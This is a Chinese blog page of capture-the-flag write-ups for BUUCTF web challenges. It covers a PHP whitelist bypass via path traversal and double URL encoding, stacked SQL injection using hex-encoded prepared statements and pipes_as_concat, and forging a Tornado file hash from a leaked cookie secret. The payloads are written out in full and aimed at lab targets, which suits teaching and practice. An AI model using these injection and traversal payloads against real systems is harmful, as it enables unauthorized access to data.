<html>
<head>
	
	<title>BUUCTF-WEB-WriteUp</title>
	<meta name="keywords" content="Curtails的blog" />

    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

    
	   <link href="/css/main.css?v=3" rel="stylesheet" type="text/css" />
    
        <script src="/js/util.js"></script>
        <script>
            if(isMobile()) {
                loadjscssfile('../css/mobile.css', 'css');
            } else {
                loadjscssfile('../css/desktop.css', 'css');
            }
        </script> 
    

    <link rel="alternate" type="application/atom+xml" href="/atom.xml" title="Atom feed">

    
	<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=3"/>
    
    

</head>

<body>


<h2 class="title">BUUCTF-WEB-WriteUp</h2>
<!---
<div style="text-align:center;margin-top: -10px;">
<div class="article-category">
发表于2019年10月10日




 </div>
--->
</div>

<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#HCTF-2018-WarmUp"><span class="toc-text">[HCTF 2018]WarmUp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#强网杯-2019-随便注"><span class="toc-text">[强网杯 2019]随便注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-tornado"><span class="toc-text">easy_tornado</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#强网杯-2019-高明的黑客"><span class="toc-text">[强网杯 2019]高明的黑客</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUCTF-2019-EasySQL"><span class="toc-text">[SUCTF 2019]EasySQL</span></a></li></ol>
<h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>打开网址显示一个滑稽 查看源码提示<code>source.php</code></p>
<ul>
<li>打开/source.php 查看源码</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>class emmm中checkFile中有一段</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br></pre></td></tr></table></figure>

<p>访问hint.php<br>显示<code>flag not here, and flag in ffffllllaaaagggg</code></p>
<ul>
<li>回去看source.php源码</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>当满足三个条件 file值不为空 file值为字符串 checkFile为真 执行file <code>任意文件包含</code></p>
<ul>
<li>前两个条件容易满足 关键checkFile返回真<br>此函数有多处返回真代码 可以利用的代码片段是两处</li>
<li>第一处利用代码</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$_page = mb_substr(</span><br><span class="line">               $page,</span><br><span class="line">               <span class="number">0</span>,</span><br><span class="line">               mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">           );</span><br><span class="line">           <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure>
<p>这一段代码条件满足字符串中<code>?</code>之前的字符串在whitelist中也就是source.php或hint.php后面紧跟../包含ffffllllaaaagggg<br>经测试需要四层../../../../<br>构造payload<code>?file=source.php?/../../../../ffffllllaaaagggg</code>或<code>?file=hint.php?/../../../../ffffllllaaaagggg</code></p>
<ul>
<li>第二处利用代码</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$_page = urldecode($page);</span><br><span class="line">$_page = mb_substr(</span><br><span class="line">    $_page,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>字符串经过一次url解码 在进行同上步骤 所以<code>?</code>两次url编码为<code>%253f</code><br>构造payload<code>?file=source.php%253f/../../../../ffffllllaaaagggg</code>或<code>?file=hint.php%253f/../../../../ffffllllaaaagggg</code></p>
<ul>
<li>flag{2d960f01-7d02-446e-9888-d9a08d6f266a}</li>
</ul>
<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>一道SQL注入题目<br>堆叠注入题目(堆叠注入就是将一堆sql语句叠加在一起执行，使用分号结束上一个语句再叠加其他语句一起执行)</p>
<ul>
<li><code>1&#39;#</code>有回显 说明参数使用单引号闭合</li>
<li>紧接着确定有多少列<code>1&#39; order by 2#</code>有回显 <code>1&#39; order by 3#</code>报错 确定两列</li>
<li>union查一下<code>1&#39; union select 1,2#</code> 显示<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code>存在关键字过滤</li>
<li>这时我们就只能试一下堆叠注入<code>1&#39;; show databases#</code> 爆出一堆数据库 不知该下手哪一个</li>
<li>爆一下表<code>1&#39;; show tables#</code> 两个表<code>1919810931114514</code>和<code>words</code></li>
<li>爆一下两个表的列</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&apos;;desc `1919810931114514`;#</span><br><span class="line">1&apos;;desc `words`;#</span><br></pre></td></tr></table></figure>

<p>回显证明1919810931114514表是有flag列</p>
<ul>
<li>没法用select直接获取flag 利用预处理 set用大小绕过<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET @sql = sql语句;  //设置变量</span><br><span class="line">PREPARE yuchuli from @sql;   //预定义SQL语句</span><br><span class="line">EXECUTE yuchuli;  //执行预定义SQL语句sqla</span><br></pre></td></tr></table></figure></li>
<li>构造payload</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET @sql = select * from `1919810931114514`;</span><br><span class="line">PREPARE yuchuli from @sql; </span><br><span class="line">EXECUTE yuchuli;</span><br></pre></td></tr></table></figure>
<p>由于select被过滤 可以用0x编码sql语句<br>最终payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&apos;;SET @sql = 0x73656C656374202A2066726F6D20603139313938313039333131313435313460;</span><br><span class="line">PREPARE yuchuli from @sql; </span><br><span class="line">EXECUTE yuchuli;#</span><br></pre></td></tr></table></figure>
<ul>
<li>flag{2a64100c-3609-4340-99ce-a18b818d9d23}</li>
</ul>
<h2 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h2><ul>
<li>打开网页显示</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/flag.txt</span><br><span class="line">/welcome.txt</span><br><span class="line">/hints.txt</span><br></pre></td></tr></table></figure>
<p>打开分别回显及对应url</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag in /fllllllllllllag    /file?filename=/flag.txt&amp;filehash=1de1224fd807cf95a218e546956e98c2</span><br><span class="line">render                      /file?filename=/welcome.txt&amp;filehash=eac6557dcd24438b369890a4f2d1059a</span><br><span class="line">md5(cookie_secret+md5(filename))    file?filename=/hints.txt&amp;filehash=cf83e929dfd5900716ae2e9c2a64e715</span><br></pre></td></tr></table></figure>
<ul>
<li>试一下<code>file?filename=/fllllllllllllag&amp;filehash=cf83e929dfd5900716ae2e9c2a64e715</code>报错ERROR 并且url<code>error?msg=Error</code></li>
<li>tornado框架存在handler.settings尝试<code>/error?msg=</code><br>得到cookie<code>459f40bc-9132-48a7-a82e-9409e8d51a00</code></li>
<li>根据md5(cookie_secret+md5(filename))得到filehash<code>97582610e7ca4534ab0858894d38a167</code></li>
<li>构造payload<code>/file?filename=/fllllllllllllag&amp;filehash=97582610e7ca4534ab0858894d38a167</code>回显flag</li>
<li>flag{62662099-e484-4bd1-9ff0-7e55496fd9b1}</li>
</ul>
<h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><p>下载的压缩文件 3002个php文件 打开都是垃圾代码<br>本题是fuzz </p>
<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>sql注入</p>
<ul>
<li>输入0无回显 输入非0回显<code>Array ( [0] =&gt; 1 )</code> 输入flag回显<code>Nonono.</code></li>
<li>输入<code>1&#39;</code>无回显</li>
<li>堆叠注入爆表<code>1;show tables#</code>回显<code>Array ( [0] =&gt; 1 ) Array ( [0] =&gt; Flag )</code></li>
<li>综上述判断内置的sql语句<code>select 输入的数据||内置的一个列名 from 表名</code>进一步判定<code>select post_data || flag from Flag</code></li>
<li>这里有两种解法<br>第一种<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第一种这里对字符过滤有所疏忽  譬如*就没有过滤 所以 注入`*,1` sql语句拼接成`select *,1 || flag from Flag`也就是`select *,1 from Flag`</span><br><span class="line">回显`Array ( [0] =&gt; flag&#123;3536a21c-ca9e-44ca-888b-75357b6df1c0&#125; [1] =&gt; 1 )`</span><br></pre></td></tr></table></figure>
第二种<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第二种才是预期解法使用`set sql_mode=pipes_as_concat;`将||变成字符串拼接而不是or 注入`1;set sql_mode=pipes_as_concat;select 1`sql语句拼接成`select 1;set sql_mode=pipes_as_concat;select 1 || flag from Flag` 其中`select 1 || flag from Flag`是将1与flag输出内容就行拼接 </span><br><span class="line">回显`Array ( [0] =&gt; 1 ) Array ( [0] =&gt; 1flag&#123;3536a21c-ca9e-44ca-888b-75357b6df1c0&#125; )`</span><br></pre></td></tr></table></figure></li>
</ul>


<!--<a href="https://curtails.github.io/2019/10/10/BUUCTF-web-writeup/#disqus_thread" class="article-comment-link">Comments</a>
<div id="disqus_thread"></div>
<script type="text/javascript">
    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
    var disqus_shortname = ''; // required: replace example with your forum shortname

    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript" target="_blank" rel="noopener">comments powered by Disqus.</a></noscript>
-->
<div style="display:none">
<script src="http://s4.cnzz.com/stat.php?id=&web_id=" language="JavaScript"></script>script>
</div>






</body>
</html>